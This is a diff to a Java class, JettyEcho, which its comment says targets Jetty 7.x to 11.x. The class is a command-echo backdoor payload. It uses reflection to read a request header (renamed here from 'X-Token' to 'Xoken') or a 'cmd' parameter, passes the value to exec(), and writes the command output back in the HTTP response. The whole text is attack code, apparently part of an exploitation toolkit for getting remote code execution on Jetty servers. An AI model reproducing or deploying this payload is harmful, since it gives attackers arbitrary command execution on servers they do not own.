@@ -19,7 +19,7 @@ import java.lang.reflect.Method;
  * 7.x、8.x、9.x、10.x、11.x
  */
 public class JettyEcho {
-    private static String HEADER = "X-Token";
+    private static String HEADER = "Xoken";
     private static String PARAM = "cmd";
     public JettyEcho() {
         try {
@@ -51,14 +51,14 @@ public class JettyEcho {
                 if (response == null)
                     continue;
 
-                String header = (String) request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
-                String param = (String) request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);
+                Object header = request.getClass().getDeclaredMethod("getHeader", String.class).invoke(request, HEADER);
+                Object param = request.getClass().getDeclaredMethod("getParameter", String.class).invoke(request, PARAM);
 
                 String result = null;
                 if (header != null) {
-                    result = exec(header);
+                    result = exec((String) header);
                 } else if (param != null) {
-                    result = exec(param);
+                    result = exec((String) param);
                 }
 
                 Object writer = response.getClass().getDeclaredMethod("getWriter").invoke(response);
